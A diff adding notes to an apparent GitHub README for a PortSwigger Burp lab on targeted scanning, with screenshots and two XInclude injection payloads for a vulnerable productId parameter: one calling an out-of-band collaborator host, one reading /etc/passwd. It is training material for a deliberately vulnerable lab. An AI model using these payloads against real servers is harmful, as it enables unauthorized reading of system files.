@@ -1,2 +1,22 @@
 # burp-essential-skills
 https://portswigger.net/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning
+
+
+Lab: Discovering vulnerabilities quickly with targeted scanning
+
+<img width="1171" height="739" alt="image" src="https://github.com/user-attachments/assets/aae630f0-4e38-4b0b-9231-29e2ccffa884" />
+
+<img width="745" height="515" alt="image" src="https://github.com/user-attachments/assets/b75cdfe9-1737-4c4f-aed4-dc75d1ee80ec" />
+
+productId parameter is vulnerable, Url encoded payload 
+<img width="524" height="538" alt="image" src="https://github.com/user-attachments/assets/cff3e345-aeb1-49ec-9dcd-e0787ecf53c7" />
+
+repeater
+
+origin payload: 
+<zyk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="http://c1e413cu8m75q33nafwztiesjjpad01p.oastify.com/foo"/></zyk>
+
+win payload:
+<zyk xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd/"/></zyk>
+
+<img width="827" height="528" alt="image" src="https://github.com/user-attachments/assets/70018d9a-e786-4361-acad-2742040ce783" />
